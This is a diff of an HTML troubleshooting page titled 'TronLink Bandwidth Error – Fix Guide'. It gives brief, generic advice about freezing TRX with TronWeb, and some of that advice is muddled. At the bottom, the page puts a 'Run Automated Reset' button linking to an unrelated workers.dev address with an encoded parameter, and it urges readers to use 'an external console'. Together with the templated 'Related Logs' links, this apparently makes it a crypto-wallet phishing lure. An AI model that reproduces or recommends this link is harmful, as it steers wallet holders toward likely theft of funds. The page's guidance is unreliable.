@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
+<head><meta charset="UTF-8"><title>TronLink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,40 +39,32 @@
 </head>
 <body>
 <div class="content">
-<h1>Tronlink Bandwidth Error</h1>
+<h1>TronLink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating a TronLink bandwidth issue, preventing them from completing transactions or interacting with the TRON network.</li>
+<li>Users encounter an error message "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth, which is a resource required for transactions on the TRON network. Bandwidth is consumed when sending transactions, and if a user's account does not have enough bandwidth, the transaction will fail.</li>
+<li>The error occurs due to insufficient bandwidth or when the account's bandwidth is depleted, preventing further transactions until the bandwidth is replenished or the account is recharged.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens, which can be done using the following commands:</li>
-<li>Freeze 1000 TRX to get 1000 bandwidth units</li>
-<li>Use the TronWeb library to interact with the TRON network and manage bandwidth</li>
-<li>Update the TronLink extension to ensure compatibility with the latest TRON network version</li>
+<li>Increase account bandwidth by calling the <code>freeze</code> function to lock TRX tokens, which in turn increases the available bandwidth:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;your_account_address&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;tron_network_address&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;freeze&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.trx.freeze<span class="o">(</span>tronweb.defaultAddress.base58,<span class="w"> </span><span class="m">10000</span><span class="o">)</span>
 </code></pre></div>
 
-<p>Consider using an external console for more complex transaction management.</p>
-<h2>Prerequisites</h2>
 <ul>
-<li>TRON network account with available TRX tokens</li>
-<li>Latest version of TronLink extension installed</li>
-<li>Basic understanding of TRON network transactions and bandwidth management</li>
+<li>Alternatively, recharge the account by transferring additional TRX to the address.</li>
+<li>Utilize a bandwidth provider or a dApp that offers free or sponsored bandwidth for its users.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li></ul>
+<p>Prerequisites:
+* TronLink wallet installed and set up
+* TRX tokens available for bandwidth increase or account recharge
+* Basic understanding of TRON network and TronLink functionality</p>
+<p>Consider utilizing an external console for more complex manual overrides and custom scripting.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
